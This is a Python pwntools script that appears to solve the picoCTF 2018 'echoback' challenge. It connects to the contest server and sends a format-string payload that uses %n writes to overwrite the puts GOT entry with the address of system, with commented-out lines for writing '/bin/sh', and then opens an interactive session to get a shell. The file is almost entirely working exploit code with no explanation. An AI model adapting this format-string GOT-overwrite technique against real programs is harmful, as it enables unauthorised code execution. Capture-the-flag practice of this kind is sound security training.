#!/usr/bin/python
from pwn import *
from textwrap import wrap

HOST = '2018shell2.picoctf.com'
PORT = 56800

def exploit() :

    system_addr = 0x08048460
    system_addr_lo = 0x8460
    system_addr_hi = 0x0804
    put_got_loc = 0x0804a01c
    # vuln_string_addr = 0x08048739
    vuln_string_addr = 0xffffd4d0
    target_inst_addr = 0x0804860f
    
    bin_sh = [
        0x2f62, 
        0x696e,
        0x2f73,
        0x6800
    ]

    # conn = process("./echoback")
    conn = remote(HOST, PORT)

    # conn.read()

    payload = ""
    payload += p32(put_got_loc) # 7th value of stack
    payload += p32(put_got_loc + 2) # 8th value of stack
    payload += p32(vuln_string_addr) # 9th value of stack
    payload += p32(vuln_string_addr + 2)
    payload += p32(vuln_string_addr + 4)
    payload += p32(vuln_string_addr + 6)
    # Overwrite to GOT lower 2-byte
    payload += "%" + str(system_addr_lo - 24) + "x" + "%7$n" 
    # Overwirte to GOT higher 2-byte
    payload += "%" + str(300 + 33390 + 9896 + 55650) + "x" + "%8$n"

    # # part for "/bin/sh"
    # payload += "%" + str(30 + 23053) + "x" + "%9$n"
    # payload += "%" + str(30 + 28 + 3072) + "x" + "%10$n"
    # payload += "%" + str(30 + 1192) + "x" + "%11$n"
    # payload += "%" + str(30 + 36123) + "x" + "%12$n"

    conn.sendline(payload)
    with open("input", "w") as f :
        f.write(payload)

    conn.interactive()

    return


exploit()